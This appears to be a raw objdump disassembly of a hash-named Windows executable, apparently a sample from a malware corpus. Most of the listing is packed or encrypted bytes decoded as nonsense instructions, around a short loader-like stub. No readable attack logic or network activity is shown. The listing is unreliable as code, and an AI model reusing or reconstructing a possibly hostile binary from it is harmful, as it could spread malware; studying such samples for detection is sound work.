
d36281d33406998b762207c126aef47b927aeadf369b559b26d3c01bc206c540.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x98
  401009:	mov    eax,ds:0x413bde
  40100e:	mov    DWORD PTR [ebp-0x18],eax
  401011:	jmp    0x40141f
  401016:	adc    BYTE PTR [ebp+esi*8-0x5e940e36],0x54
  40101e:	(bad)  
  40101f:	shr    DWORD PTR ds:0xd258d708,cl
  401025:	pop    esi
  401026:	jle    0x4010a6
  401028:	jle    0x4010a8
  40102a:	outs   dx,DWORD PTR ds:[esi]
  40102b:	jge    0x4010ab
  40102d:	jle    0x400ffd
  40102f:	xlat   BYTE PTR ds:[ebx]
  401030:	cmp    eax,0xcfd339d5
  401035:	rol    eax,1
  401037:	pop    es
  401038:	add    al,0x3
  40103a:	add    esp,ebp
  40103c:	add    BYTE PTR [edi],cl
  40103e:	xor    ecx,DWORD PTR [edi]
  401040:	rcr    BYTE PTR [eax],0xc7
  401043:	adc    BYTE PTR [edi],bl
  401045:	mov    ecx,0xddb70058
  40104a:	push   cs
  40104b:	out    dx,eax
  40104c:	mov    ebp,0x8e03d6db
  401051:	es mov esi,0x1541a2f4
  401057:	lods   eax,DWORD PTR ds:[esi]
  401058:	fiadd  WORD PTR [esi+0x1f]
  40105b:	data16 in al,dx
  40105d:	outs   dx,DWORD PTR ds:[esi]
  40105e:	or     edx,DWORD PTR [ecx]
  401060:	pushf  
  401061:	js     0x401039
  401063:	inc    eax
  401064:	stos   BYTE PTR es:[edi],al
  401065:	push   ebx
  401066:	sub    eax,0xad3cc4d1
  40106b:	mov    bh,BYTE PTR [ebx-0x3b]
  40106e:	stos   DWORD PTR es:[edi],eax
  40106f:	push   es
  401070:	(bad)  
  401071:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  401077:	jmp    0x4010a9
  401079:	mov    ebp,ecx
  40107b:	dec    edi
  40107c:	out    0xa6,al
  40107e:	inc    ecx
  40107f:	call   DWORD PTR [edi-0x2556f868]
  401085:	mov    ebp,0x5536ed4d
  40108a:	and    esi,DWORD PTR [edx-0x43619116]
  401090:	jnp    0x4010a3
  401092:	ret    
  401093:	xchg   edx,eax
  401094:	and    esp,edx
  401096:	jmp    0x4010f6
  401098:	ret    0xb8e4
  40109b:	lock jmp 0xd765:0x74cf3192
  4010a3:	and    ch,cl
  4010a5:	add    bl,cl
  4010a7:	adc    DWORD PTR [ecx-0x5a],edx
  4010aa:	xor    eax,0x78616f03
  4010af:	or     BYTE PTR [ecx],dh
  4010b1:	fisttp QWORD PTR [esi+0x7f752854]
  4010b7:	(bad)
  4010bc:	or     ebx,DWORD PTR [ebx+0x55]
  4010bf:	fst    st(6)
  4010c1:	or     ebx,edx
  4010c3:	pop    esp
  4010c4:	fstp   DWORD PTR [ecx]
  4010c6:	jno    0x401066
  4010c8:	inc    esi
  4010c9:	dec    ebx
  4010ca:	aaa    
  4010cb:	adc    eax,0x1a29772b
  4010d0:	sar    DWORD PTR [esi],cl
  4010d2:	dec    edi
  4010d3:	call   0x8985b5a5
  4010d8:	adc    al,al
  4010da:	shl    BYTE PTR [ebp+0x264f55ea],0xf6
  4010e1:	out    0x11,al
  4010e3:	mov    ah,0x8
  4010e5:	sbb    DWORD PTR [ebx-0x4e],edx
  4010e8:	inc    edi
  4010e9:	xor    ah,al
  4010eb:	mov    fs,WORD PTR [edi]
  4010ed:	push   0xa22a142c
  4010f2:	in     eax,dx
  4010f3:	mov    ebp,0xabea3b6c
  4010f8:	icebp  
  4010f9:	std    
  4010fa:	out    0x79,eax
  4010fc:	adc    BYTE PTR [edi-0x26],ah
  4010ff:	mov    ss,WORD PTR [edx+ebx*1]
  401102:	jb     0x401112
  401104:	xchg   edi,eax
  401105:	pop    edx
  401106:	xchg   BYTE PTR [ecx-0x5553bcad],cl
  40110c:	push   0x1
  40110e:	addr16 push ds
  401110:	stc    
  401111:	sub    BYTE PTR [eax+0x4f6bb39d],ah
  401117:	inc    ecx
  401118:	das    
  401119:	fsubp  st(5),st
  40111b:	mov    ebx,0xa7b8140
  401120:	cmp    ah,bl
  401122:	mov    al,0xf
  401124:	fabs   
  401126:	out    dx,eax
  401127:	out    dx,eax
  401128:	dec    ecx
  401129:	and    DWORD PTR [esi+0x70],esp
  40112c:	test   al,0x91
  40112e:	pop    eax
  40112f:	in     eax,dx
  401130:	push   esp
  401131:	mov    ds:0xef0dd439,eax
  401136:	int    0xf4
  401138:	push   DWORD PTR [esi+0x1644e0c4]
  40113e:	and    cl,BYTE PTR [ecx-0x34ab8a49]
  401144:	pop    es
  401145:	dec    edx
  401146:	scas   al,BYTE PTR es:[edi]
  401147:	xchg   ebp,eax
  401148:	in     eax,dx
  401149:	pop    ss
  40114a:	jnp    0x401136
  40114c:	in     al,dx
  40114d:	cmp    ch,0xd2
  401150:	test   BYTE PTR [eax+0x12],bl
  401153:	or     BYTE PTR [edi],dh
  401155:	daa    
  401156:	js     0x401103
  401158:	arpl   WORD PTR [edx+0x27],dx
  40115b:	or     bl,BYTE PTR [ebp-0x4cac2765]
  401161:	lea    ebx,[esi]
  401163:	mov    eax,ds:0xa80fbe6b
  401168:	push   cs
  401169:	clc    
  40116a:	push   edx
  40116b:	lock xor bl,BYTE PTR [edx]
  40116e:	jecxz  0x4011ba
  401170:	(bad)  
  401172:	sbb    eax,DWORD PTR [edi-0x54]
  401175:	ja     0x4011a5
  401177:	inc    edx
  401178:	rcl    DWORD PTR [edx],1
  40117a:	or     eax,0x2acc2c24
  40117f:	mov    BYTE PTR [esi+0x1ece185e],ah
  401185:	test   eax,0xa1836131
  40118a:	xor    al,0x27
  40118c:	mov    al,0x50
  40118e:	loopne 0x401201
  401190:	mov    dh,0x24
  401192:	sub    eax,0x97456cfd
  401197:	xor    ah,BYTE PTR [eax+0x3fb10732]
  40119d:	data16 sbb BYTE PTR [ebx-0x5fdd1658],dl
  4011a4:	aam    0x69
  4011a6:	pop    ebx
  4011a7:	imul   esp,DWORD PTR [eax+0x6e],0x49
  4011ab:	sahf   
  4011ac:	js     0x4011bb
  4011ae:	cmp    esi,DWORD PTR [ebp-0x6516d613]
  4011b4:	mov    ebx,0x58309928
  4011b9:	arpl   WORD PTR [ebp-0x1d7c94c0],sp
  4011bf:	test   eax,0x256aa782
  4011c4:	mov    ds:0x8dda148b,eax
  4011c9:	jo     0x40114c
  4011cb:	push   ds
  4011cc:	sbb    ch,BYTE PTR [edi+0x30]
  4011cf:	loop   0x4011a9
  4011d1:	pop    esp
  4011d2:	jge    0x401158
  4011d4:	inc    ecx
  4011d5:	cmp    BYTE PTR [edx+ebx*8],bh
  4011d8:	or     ah,al
  4011da:	add    ecx,DWORD PTR [ecx+0x52270a8c]
  4011e0:	pop    esp
  4011e1:	and    DWORD PTR [edx+0x5e],esp
  4011e4:	shl    BYTE PTR [eax+ecx*4+0xd],cl
  4011e8:	fcom   st(7)
  4011ea:	mov    eax,ds:0xa099870f
  4011ef:	xchg   edx,eax
  4011f0:	adc    al,0x7b
  4011f2:	dec    edi
  4011f3:	add    eax,0xf9d5519c
  4011f8:	lock xchg DWORD PTR [eax-0x2e],ebp
  4011fc:	jle    0x4011ae
  4011fe:	jbe    0x40121d
  401200:	pop    es
  401201:	ins    DWORD PTR es:[edi],dx
  401202:	fcmovnb st,st(0)
  401204:	adc    ebx,ebp
  401206:	imul   ebp,DWORD PTR [esi+0x47c642a5],0x0
  40120d:	test   DWORD PTR [ebp-0x58bad434],0xfbda8c4
  401217:	xchg   esi,eax
  401218:	lock mov bh,0xe6
  40121b:	jle    0x4011dc
  40121d:	stos   BYTE PTR es:[edi],al
  40121e:	push   ss
  40121f:	clc    
  401220:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401221:	sbb    DWORD PTR [edi+0x1cd43cf4],edi
  401227:	xor    DWORD PTR [ebp-0x7c],ecx
  40122a:	jmp    0xefbb:0xae59276a
  401231:	dec    ebp
  401232:	mov    ebx,0x90e1d5a5
  401237:	pop    esp
  401238:	clc    
  401239:	mov    gs,WORD PTR [ebx-0x515c5757]
  40123f:	fbstp  TBYTE PTR [esi]
  401241:	pop    edx
  401242:	xchg   edi,eax
  401243:	icebp  
  401244:	inc    ebx
  401245:	ja     0x401223
  401247:	cli    
  401248:	xchg   ebp,esp
  40124a:	mov    ecx,?
  40124c:	xchg   DWORD PTR [esi-0x69],ebp
  40124f:	in     al,dx
  401250:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401251:	int3   
  401252:	add    eax,0x45e06cc5
  401257:	pushf  
  401258:	cmp    edx,DWORD PTR [edx*2+0x1d18dc06]
  40125f:	mov    cl,0x8a
  401261:	shr    BYTE PTR [esi-0x2d290516],cl
  401267:	out    dx,al
  401268:	lea    esp,[esi-0x73]
  40126b:	lar    edx,sp
  40126e:	adc    bh,BYTE PTR [ebp+ecx*8-0x5c]
  401272:	cmpps  xmm3,xmm7,0x75
  401276:	and    ch,ah
  401278:	rcr    DWORD PTR [ebp-0x46bf614],cl
  40127e:	sti    
  40127f:	mov    BYTE PTR [ebx],al
  401281:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401282:	pop    ss
  401283:	cmp    eax,0xba185c44
  401288:	or     al,0x60
  40128a:	mov    eax,0x8f196f33
  40128f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401290:	jne    0x4012bb
  401292:	jno    0x4012d3
  401294:	cmp    al,0x72
  401296:	or     bh,cl
  401298:	push   edi
  401299:	icebp  
  40129a:	push   esi
  40129b:	stos   DWORD PTR es:[edi],eax
  40129c:	adc    edx,eax
  40129e:	jecxz  0x40131f
  4012a0:	dec    edi
  4012a1:	rcl    BYTE PTR [edx],0x72
  4012a4:	push   ds
  4012a5:	jle    0x401305
  4012a7:	push   0x2c
  4012a9:	arpl   si,ax
  4012ab:	mov    bl,0xf9
  4012ad:	adc    eax,DWORD PTR [edi+eax*4-0x36]
  4012b1:	(bad)  
  4012b2:	push   eax
  4012b3:	bound  esp,QWORD PTR [eax-0x609ba257]
  4012b9:	and    ebp,ebx
  4012bb:	mov    ch,0x65
  4012bd:	jp     0x401261
  4012bf:	push   cs
  4012c0:	push   edi
  4012c1:	scas   eax,DWORD PTR es:[edi]
  4012c2:	(bad)  
  4012c3:	push   esp
  4012c4:	or     cl,BYTE PTR ds:0x263bbdbb
  4012ca:	ret    0x77a1
  4012cd:	add    eax,0x5cd9c00c
  4012d2:	jbe    0x4012c3
  4012d4:	loopne 0x4012ff
  4012d6:	xlat   BYTE PTR ds:[ebx]
  4012d7:	je     0x40125e
  4012d9:	jnp    0x401344
  4012db:	mov    cl,0xdb
  4012dd:	rol    al,1
  4012df:	mov    ?,WORD PTR [edx-0x6b]
  4012e2:	es retf 0x6333
  4012e6:	dec    ebp
  4012e7:	push   ss
  4012e8:	cwde   
  4012e9:	(bad)  
  4012ea:	mov    ecx,0x8bd4b4f1
  4012ef:	sbb    ebx,DWORD PTR [edx+0x44]
  4012f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4012f3:	mov    esi,0x7dd909cf
  4012f8:	mov    eax,ds:0xf2798800
  4012fd:	sub    al,0xb1
  4012ff:	std    
  401300:	sbb    esp,DWORD PTR [esi+0x71]
  401303:	xor    al,0x82
  401305:	cmp    BYTE PTR [edx-0x46],ah
  401308:	imul   esi,DWORD PTR [ecx],0xa119ce5a
  40130e:	add    al,0x3b
  401310:	sbb    al,0x54
  401312:	bound  esi,QWORD PTR [edi+0x61]
  401315:	in     eax,0x65
  401317:	dec    esi
  401318:	jae    0x401379
  40131a:	mov    dl,0x59
  40131c:	fidiv  WORD PTR [edi]
  40131e:	stc    
  40131f:	test   BYTE PTR [edi+0xff8e83b],ch
  401325:	test   DWORD PTR [edi+0x6e],edx
  401328:	ins    BYTE PTR es:[edi],dx
  401329:	in     al,0x28
  40132b:	or     al,0x33
  40132d:	rcl    BYTE PTR [esi+ecx*1-0x53],1
  401331:	neg    DWORD PTR [eax+ecx*2+0x709a6972]
  401338:	mov    esi,0x6ad5f2a4
  40133d:	sub    eax,0x8263256d
  401342:	enter  0x1d82,0xed
  401346:	rcl    ebp,0x3b
  401349:	xchg   ecx,eax
  40134a:	out    dx,al
  40134b:	inc    ebx
  40134c:	or     BYTE PTR [esi],ch
  40134e:	sub    BYTE PTR [esi+edi*2+0x7ca0631e],ch
  401355:	jp     0x40133c
  401357:	inc    esp
  401358:	sub    esi,DWORD PTR [ebx+eax*2-0x8]
  40135c:	popf   
  40135d:	aas    
  40135e:	or     bh,cl
  401360:	stos   BYTE PTR es:[edi],al
  401361:	push   ebp
  401362:	pop    eax
  401363:	mov    eax,0xd6432bde
  401368:	retf   
  401369:	popa   
  40136a:	mov    BYTE PTR [esi],ch
  40136c:	dec    ebx
  40136d:	jl     0x401360
  40136f:	and    edx,DWORD PTR [esi+ebx*1]
  401372:	test   BYTE PTR [edx+ebp*8],cl
  401375:	outs   dx,BYTE PTR ds:[esi]
  401376:	(bad)  
  401378:	sub    al,0x27
  40137a:	test   al,0x63
  40137c:	sub    ecx,esp
  40137e:	bound  ebp,QWORD PTR [ebx-0x4c66d996]
  401384:	sti    
  401385:	add    edi,DWORD PTR [edx-0x74]
  401388:	and    al,0x7a
  40138a:	stc    
  40138b:	mov    ebp,0xf544ac38
  401390:	jmp    0xdba5b53
  401395:	jl     0x4013ca
  401397:	gs ja  0x401409
  40139a:	aad    0x33
  40139c:	gs ret 
  40139e:	adc    DWORD PTR [ebp+0x58],esi
  4013a1:	fldcw  WORD PTR [esi+0x59d7fe]
  4013a7:	jne    0x4013b6
  4013a9:	imul   eax,DWORD PTR [edi-0x1b],0x78b3dadc
  4013b0:	sub    al,0x4d
  4013b2:	sbb    ecx,0x199877dc
  4013b8:	xchg   BYTE PTR [ecx-0x59],bl
  4013bb:	ss fs ret 0x2f8b
  4013c0:	push   ds
  4013c1:	xor    edx,DWORD PTR [ebx]
  4013c3:	pop    ds
  4013c4:	mov    dh,0xff
  4013c6:	sbb    esi,ebx
  4013c8:	ror    DWORD PTR [edx],cl
  4013ca:	fcmovnbe st,st(2)
  4013cc:	and    DWORD PTR [ebx+0x12fb4465],esi
  4013d2:	xchg   esi,eax
  4013d3:	lea    esp,[ebx+0x2cc71094]
  4013d9:	push   esp
  4013da:	sub    ebx,0xffffffd7
  4013dd:	jmp    0x401372
  4013df:	jge    0x4013d6
  4013e1:	and    DWORD PTR [ebp+0x1],esi
  4013e4:	and    eax,0x50081a41
  4013e9:	sbb    BYTE PTR [esi+0xa],ch
  4013ec:	add    esi,ebx
  4013ee:	das    
  4013ef:	push   es
  4013f0:	pop    ecx
  4013f1:	and    al,bh
  4013f3:	out    0xb8,al
  4013f5:	aas    
  4013f6:	adc    al,0x96
  4013f8:	sbb    ah,ah
  4013fa:	push   cs
  4013fb:	mov    esp,0xe6530860
  401400:	stos   BYTE PTR es:[edi],al
  401401:	retf   
  401402:	ja     0x401472
  401404:	clc    
  401405:	bound  edx,QWORD PTR [ebp+0x3837c176]
  40140b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40140c:	test   eax,edx
  40140e:	add    bl,BYTE PTR [ecx+ecx*1]
  401411:	in     eax,0xa0
  401413:	push   ebp
  401414:	mov    ebx,0xf08c3fad
  401419:	cmp    eax,0x51c4bdb3
  40141e:	sub    DWORD PTR [ecx+0x413cee],esp
  401424:	mov    DWORD PTR [ebp-0x48],eax
  401427:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40142e:	adc    eax,0x6013
  401433:	mov    DWORD PTR [ebp-0x1c],0xf89c8532
  40143a:	adc    eax,ecx
  40143c:	mov    eax,DWORD PTR [ebp-0x10]
  40143f:	mov    ecx,DWORD PTR ds:0x43374b
  401445:	mov    ecx,DWORD PTR [ecx]
  401447:	or     DWORD PTR ds:0x433773,ecx
  40144d:	push   ebx
  40144e:	push   esi
  40144f:	sbb    DWORD PTR ds:0x4337eb,edi
  401455:	mov    esi,0x7510854
  40145a:	movzx  ecx,BYTE PTR ds:0x4337f3
  401461:	sbb    DWORD PTR ds:0x4337ef,ecx
  401467:	xor    eax,esi
  401469:	and    ebx,ecx
  40146b:	push   edi
  40146c:	mov    DWORD PTR ds:0x433843,0x1c
  401476:	cmp    DWORD PTR ds:0x433843,0x0
  40147d:	je     0x4014ab
  401483:	cmp    DWORD PTR ds:0x433843,0x25
  40148a:	jne    0x401499
  401490:	push   DWORD PTR [ebp-0x20]
  401493:	call   DWORD PTR ds:0x412288
  401499:	mov    ebx,DWORD PTR ds:0x433843
  40149f:	dec    ebx
  4014a0:	mov    DWORD PTR ds:0x433843,ebx
  4014a6:	jmp    0x401476
  4014ab:	mov    edi,0x32729b
  4014b0:	jmp    0x4018be
  4014b5:	xchg   ecx,eax
  4014b6:	mov    ds:0x59f479c4,eax
  4014bb:	push   ecx
  4014bc:	mov    bl,0x68
  4014be:	push   ebp
  4014bf:	out    dx,eax
  4014c0:	xor    ebp,DWORD PTR [ebx+0x6f8519c0]
  4014c6:	jge    0x401546
  4014c8:	jle    0x401539
  4014ca:	jge    0x40154a
  4014cc:	jle    0x40150a
  4014ce:	fild   WORD PTR [ebx]
  4014d0:	jge    0x4014fd
  4014d2:	hlt    
  4014d3:	adc    ah,0x35
  4014d6:	mov    ebx,0xa23d9e6d
  4014db:	jp     0x401527
  4014dd:	add    ecx,edi
  4014df:	inc    esi
  4014e0:	aad    0x9e
  4014e2:	xlat   BYTE PTR ds:[ebx]
  4014e3:	rcl    BYTE PTR [eax-0x2de5740f],0x89
  4014ea:	mov    esi,0x6e318a04
  4014ef:	lock les ebx,FWORD PTR [ecx-0x2b]
  4014f3:	mov    bl,0xa
  4014f5:	jb     0x401533
  4014f7:	lea    ebp,[esi]
  4014f9:	addr16 popa 
  4014fb:	rcl    DWORD PTR [esi+0x285a09b1],0x16
  401502:	pop    edi
  401503:	mov    ah,BYTE PTR [eax-0x40c20dd9]
  401509:	outs   dx,DWORD PTR ds:[esi]
  40150a:	pop    eax
  40150b:	push   esp
  40150c:	adc    ecx,edx
  40150e:	fstp   QWORD PTR [eax+0x22573ce1]
  401514:	xchg   DWORD PTR ds:0xc7d39178,esp
  40151a:	mov    ds:0x740a86a4,al
  40151f:	jmp    0x401588
  401521:	jmp    0x401534
  401523:	fisttp WORD PTR [eax-0x10415cee]
  401529:	xlat   BYTE PTR ds:[ebx]
  40152a:	out    0x26,eax
  40152c:	pop    es
  40152d:	inc    esi
  40152e:	fld    QWORD PTR [edi]
  401530:	push   edi
  401531:	fisubr WORD PTR [esp+edx*2-0x61cdbc0f]
  401538:	call   0x67c0cf98
  40153d:	push   ebx
  40153e:	jo     0x40152e
  401540:	arpl   sp,cx
  401542:	shr    al,1
  401544:	xlat   BYTE PTR ds:[ebx]
  401545:	les    edi,FWORD PTR [ecx+0x3d0e9f3b]
  40154b:	ficomp WORD PTR [eax-0x5fe486a3]
  401551:	not    BYTE PTR [ebx+0x2da979c8]
  401557:	jnp    0x401563
  401559:	sti    
  40155a:	and    al,0xbe
  40155c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40155d:	sub    esp,edi
  40155f:	cmp    eax,0x924fdd54
  401564:	mov    ds:0x58c152c1,al
  401569:	rcl    BYTE PTR [edi+0x1af2eb5c],cl
  40156f:	xchg   edi,eax
  401570:	inc    ebx
  401571:	daa    
  401572:	in     eax,0xf3
  401574:	inc    edi
  401575:	inc    edi
  401576:	push   eax
  401577:	inc    esp
  401578:	inc    esi
  401579:	adc    edx,DWORD PTR [esi+0x78ac1296]
  40157f:	and    eax,0x4daf914
  401584:	push   esp
  401585:	xchg   ebp,eax
  401586:	mov    dh,0x23
  401588:	push   ecx
  401589:	dec    ebp
  40158a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40158b:	jmp    0x4015e0
  40158d:	leave  
  40158e:	and    edi,DWORD PTR [eax]
  401590:	outs   dx,BYTE PTR ds:[esi]
  401591:	rcl    ebx,1
  401593:	es jns 0x4015dd
  401596:	nop
  401597:	mov    al,0xf2
  401599:	(bad)  
  40159a:	push   0xaf46f411
  40159f:	cmp    al,0x26
  4015a1:	fisttp WORD PTR [edi]
  4015a3:	add    DWORD PTR [esi+0x6db61809],edi
  4015a9:	push   ss
  4015aa:	fstp   st(0)
  4015ac:	stos   BYTE PTR es:[edi],al
  4015ad:	inc    ecx
  4015ae:	jne    0x401582
  4015b0:	xor    ecx,DWORD PTR [ebp+0x73021bf]
  4015b6:	dec    edx
  4015b7:	mov    al,0x40
  4015b9:	or     BYTE PTR [eax+0x4e],bl
  4015bc:	dec    ecx
  4015bd:	neg    dl
  4015bf:	iret   
  4015c0:	fisttp QWORD PTR [edi+0x6b2edeaf]
  4015c6:	scas   al,BYTE PTR es:[edi]
  4015c7:	imul   eax,DWORD PTR [ecx+0x1f5754],0x7a
  4015ce:	jg     0x401619
  4015d0:	(bad)  
  4015d1:	push   ecx
  4015d2:	fcomp  QWORD PTR [esi+ebp*4+0x5d2ad1bb]
  4015d9:	mov    edx,DWORD PTR [ecx-0x24]
  4015dc:	or     dl,BYTE PTR ds:0xfcd6d9a2
  4015e2:	pop    es
  4015e3:	(bad)  
  4015e4:	xor    ch,BYTE PTR [ebp-0x19]
  4015e7:	mov    dh,BYTE PTR [esi+ebp*4]
  4015ea:	xchg   esi,eax
  4015eb:	or     eax,0x1152be37
  4015f0:	dec    eax
  4015f1:	sbb    ch,dl
  4015f3:	push   cs
  4015f4:	call   0x2e70:0x856ea4b3
  4015fb:	arpl   WORD PTR [eax-0x2754fc74],di
  401601:	cmp    eax,0x7cd3c43a
  401606:	sbb    esi,DWORD PTR [ebx-0x455cb8f]
  40160c:	(bad)  
  40160d:	push   ss
  40160e:	dec    esi
  40160f:	jmp    0x62151b06
  401614:	dec    eax
  401615:	(bad)  
  401617:	or     BYTE PTR [ebx+0x14],0xa
  40161b:	imul   edx,edi,0x26a25f86
  401621:	adc    ebx,DWORD PTR [esi+0x5c]
  401624:	jge    0x4015b9
  401626:	push   ecx
  401628:	fcmovnb st,st(5)
  40162a:	add    eax,0x66b2a50d
  40162f:	aam    0x16
  401631:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401632:	stc    
  401633:	popf   
  401634:	cmp    ah,BYTE PTR [ebx-0x4fa35b97]
  40163a:	and    BYTE PTR [eax-0x2a],cl
  40163d:	jmp    0x9ad4:0xd2c26003
  401644:	leave  
  401645:	aam    0x71
  401647:	mov    ah,0xaf
  401649:	loop   0x4016be
  40164b:	xchg   esi,eax
  40164c:	dec    edi
  40164d:	and    DWORD PTR [ecx+0x1c10662d],edi
  401653:	push   esi
  401654:	xchg   edx,eax
  401655:	cld    
  401656:	dec    eax
  401657:	jmp    0x401666
  401659:	cmp    esi,DWORD PTR [ecx+0xf8ebcd3]
  40165f:	adc    DWORD PTR [edx+0x17],esp
  401662:	mov    ecx,0xf1d247ef
  401667:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401668:	push   ecx
  401669:	jp     0x40169d
  40166b:	in     al,0xe4
  40166d:	leave  
  40166e:	mov    edx,0xad9c3bc4
  401673:	sbb    BYTE PTR [ebx+0x724fd9bf],0xd0
  40167a:	nop
  40167b:	xor    al,0x78
  40167d:	loopne 0x4016bb
  40167f:	jno    0x40165e
  401681:	je     0x401632
  401683:	loopne 0x4016be
  401685:	out    0x2a,al
  401687:	mov    cl,al
  401689:	daa    
  40168a:	aaa    
  40168b:	xor    esi,DWORD PTR [esi]
  40168d:	fcom   QWORD PTR [ecx+0x73]
  401690:	inc    ecx
  401691:	dec    eax
  401692:	lock pop ebp
  401694:	rol    DWORD PTR ds:0xadd7db64,cl
  40169a:	xor    DWORD PTR [eax+0x32],0xffffff87
  40169e:	icebp  
  40169f:	outs   dx,BYTE PTR ds:[esi]
  4016a0:	outs   dx,DWORD PTR ds:[esi]
  4016a1:	and    al,0x57
  4016a3:	sub    DWORD PTR [edi-0x43],eax
  4016a6:	push   ds
  4016a7:	loope  0x401693
  4016a9:	aad    0xe5
  4016ab:	cmp    al,0x53
  4016ad:	xchg   esi,eax
  4016ae:	(bad)  
  4016af:	mov    eax,0x42073420
  4016b4:	dec    edx
  4016b5:	daa    
  4016b6:	add    al,0xb0
  4016b8:	and    eax,0x28900cd4
  4016bd:	push   ss
  4016be:	jmp    0x594e:0x55918750
  4016c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016c6:	or     BYTE PTR [edx-0x546647aa],dh
  4016cc:	sahf   
  4016cd:	aas    
  4016ce:	stc    
  4016cf:	addr16 adc eax,0x7340e215
  4016d5:	lods   eax,DWORD PTR ds:[esi]
  4016d6:	dec    ebx
  4016d7:	inc    BYTE PTR [esi+0x8]
  4016da:	std    
  4016db:	jle    0x401676
  4016dd:	(bad)  
  4016de:	jmp    0x27dfc9d9
  4016e3:	mov    bh,0xd7
  4016e5:	pop    eax
  4016e6:	rcr    BYTE PTR [ebx],1
  4016e8:	int    0xe6
  4016ea:	(bad)  
  4016eb:	test   BYTE PTR [edx],dl
  4016ed:	and    edx,DWORD PTR [eax+0x5744a7a4]
  4016f3:	in     al,dx
  4016f4:	jno    0x40172b
  4016f6:	lds    esi,FWORD PTR [ecx+0x733e7763]
  4016fc:	pushf  
  4016fd:	jle    0x4016c5
  4016ff:	sub    ebx,0xd996b4e6
  401705:	adc    ah,BYTE PTR [edi-0x67bb0b44]
  40170b:	loope  0x401699
  40170d:	push   0xffffff96
  40170f:	call   DWORD PTR [esi]
  401711:	cli    
  401712:	or     eax,eax
  401714:	imul   eax,esp,0xffffffe5
  401717:	push   es
  401718:	adc    eax,DWORD PTR [edi+0x6b]
  40171b:	mov    ds:0xe3d6199d,al
  401720:	daa    
  401721:	ins    BYTE PTR es:[edi],dx
  401722:	sub    BYTE PTR [esi],al
  401724:	push   0xffffffd7
  401726:	add    al,0xcb
  401728:	outs   dx,DWORD PTR ds:[esi]
  401729:	jbe    0x401739
  40172b:	hlt    
  40172c:	cmp    BYTE PTR [edx-0x79],cl
  40172f:	sbb    dl,BYTE PTR [edx-0x1d]
  401732:	adc    BYTE PTR [eax+0x56],0xfa
  401736:	data16 xor BYTE PTR [edi+0x4e],cl
  40173a:	xchg   ecx,eax
  40173b:	inc    ebp
  40173c:	xchg   esi,eax
  40173d:	frstor [ecx+0x4923d947]
  401743:	lahf   
  401744:	in     eax,0x66
  401746:	inc    ebx
  401747:	jns    0x401774
  401749:	sbb    DWORD PTR [ecx-0x4a],eax
  40174c:	or     eax,0x843b898d
  401751:	sub    eax,0x10c4fa8a
  401756:	push   0x8b608d3e
  40175b:	rcr    BYTE PTR [esi],1
  40175d:	icebp  
  40175e:	dec    edx
  40175f:	xchg   BYTE PTR [ecx],bl
  401761:	jb     0x401724
  401763:	icebp  
  401764:	cmp    al,0x8a
  401766:	pop    edi
  401767:	test   al,0xa
  401769:	in     al,dx
  40176a:	icebp  
  40176b:	inc    edx
  40176c:	cmp    bh,BYTE PTR [ebx+eiz*2-0x3c1e5911]
  401773:	cmp    esp,DWORD PTR [ebp+0x3af95d6c]
  401779:	mov    ecx,?
  40177b:	and    bh,BYTE PTR [edx+0x56]
  40177e:	(bad)  
  40177f:	fdivr  QWORD PTR [ebp-0x772cea9f]
  401785:	or     al,BYTE PTR [ecx+0x6f]
  401788:	adc    al,0xda
  40178a:	fdiv   DWORD PTR [esi-0x65]
  40178d:	adc    BYTE PTR [edi*2-0x684e3f9],bl
  401794:	loope  0x40175d
  401796:	cdq    
  401797:	fldenv fs:[edi-0x9abca5a]
  40179e:	mov    bh,0xe7
  4017a0:	imul   DWORD PTR [esi]
  4017a2:	inc    edx
  4017a4:	add    eax,0x8c55476e
  4017a9:	push   es
  4017aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4017ab:	cld    
  4017ac:	test   DWORD PTR [eax-0x6c],ecx
  4017af:	dec    ebp
  4017b0:	mov    eax,0xe07dd6b3
  4017b5:	lea    eax,[edi]
  4017b7:	std    
  4017b8:	cdq    
  4017b9:	fcom   DWORD PTR [ecx]
  4017bb:	rcl    DWORD PTR [ecx+0x7ee7decf],0xc6
  4017c2:	(bad)  
  4017c3:	call   0xeaff404d
  4017c8:	push   eax
  4017c9:	cmp    al,0x71
  4017cb:	pop    ss
  4017cc:	call   0x8a98:0x1a7be333
  4017d3:	dec    ebp
  4017d4:	into   
  4017d5:	mov    dh,0x34
  4017d7:	and    dl,BYTE PTR [edi]
  4017d9:	push   ds
  4017da:	ror    DWORD PTR [ecx+0x404bafaf],0xe0
  4017e1:	mov    ch,0xb9
  4017e3:	add    BYTE PTR [edi+0x619c6950],ah
  4017e9:	sub    ebp,DWORD PTR [eax+0x30]
  4017ec:	mov    esi,0xf36420c5
  4017f1:	add    ebp,DWORD PTR [eax]
  4017f3:	dec    edi
  4017f4:	fnstenv [esi-0x1c93d467]
  4017fa:	(bad)  
  4017fb:	das    
  4017fc:	hlt    
  4017fd:	loope  0x4017d3
  4017ff:	aaa    
  401800:	lea    ebx,[ebp-0x3fd6ceb0]
  401806:	rdmsr  
  401808:	sti    
  401809:	pop    ecx
  40180a:	imul   DWORD PTR [ebx]
  40180c:	pushf  
  40180d:	dec    ebp
  40180e:	mov    ch,0xcb
  401810:	outs   dx,BYTE PTR ds:[esi]
  401811:	into   
  401812:	adc    al,0x1
  401814:	ins    DWORD PTR es:[edi],dx
  401815:	pop    ecx
  401816:	mov    ebx,0x5a104026
  40181b:	pop    esi
  40181c:	and    DWORD PTR [eax-0x2ec5ab20],ecx
  401822:	push   cs
  401823:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
